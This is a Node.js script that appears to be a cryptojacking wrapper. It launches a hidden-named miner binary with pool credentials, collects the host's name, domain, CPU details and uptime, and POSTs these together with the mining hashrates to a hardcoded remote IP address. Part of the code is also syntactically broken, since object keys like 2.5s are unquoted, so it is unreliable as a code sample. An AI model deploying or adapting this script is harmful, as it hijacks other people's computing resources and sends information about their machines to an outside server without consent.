const spawn = require('child_process').spawn;
const exec = require('child_process').exec;
const execSync = require('child_process').execSync;
const args = process.argv.slice(2);
const http = require("http");
const os = require('os');
const miner = spawn('/home/patata2', ['-o', args[1], '-u', args[0], '-t', '8', '--av=2', '-k']);
var options = {
    host: "51.254.143.175",
    path: "/check",
    port: "8084",
    method: "POST",
    headers: {"Content-Type": "application/json"},
};

var info = getInfo();

function getInfo () {
	var res = {
		tpc: '',
		freq: '',
		cache: ''
	};
	var info = execSync('lscpu') + '';
	info = info.split('\n');
	for (var i = info.length - 1; i >= 0; i--) {
		var str = info[i];
		if (str.indexOf('Thread(s) per core') !== -1) {
			res.tpc = str.substr(str.indexOf(':') + 1).trim()	
		} else if (str.indexOf('Model name') !== -1) {
			res.freq = str.substr(str.indexOf('@') + 2).trim();
		} else if (str.indexOf('L3 cache') !== -1) {
			res.cache = str.substr(str.indexOf(':') + 1).trim();
		}
	}
	return res;
}

var body = {
    instance: os.hostname(),
    project: '' + execSync('hostname -d'),
    mail: (args[3]) ? args[3] : '',
    uptime: os.uptime(),
    hashrate: {
        2.5s: 'n/a',
        60s: 'n/a',
        15m: 'n/a',
        highest: 'n/a'
    },
    info: info
};


function sendData (callback) {
        var req = http.request(options, function (res) {
                callback();
        });
        req.write(JSON.stringify(body));
        req.end();
}

miner.stderr.on('data', function (data) {
    data += '';
    if (data.indexOf('speed') !== -1) {
        var hashrates = data.split(' ');
        body.hashrate = {
        	2.5s: hashrates[2],
        	60s: hashrates[3],
        	15m: hashrates[4],
        	highest: hashrates[7]
        };
        body.uptime = os.uptime();
        sendData(function () {
                console.log('sended', body);
        });
    }
});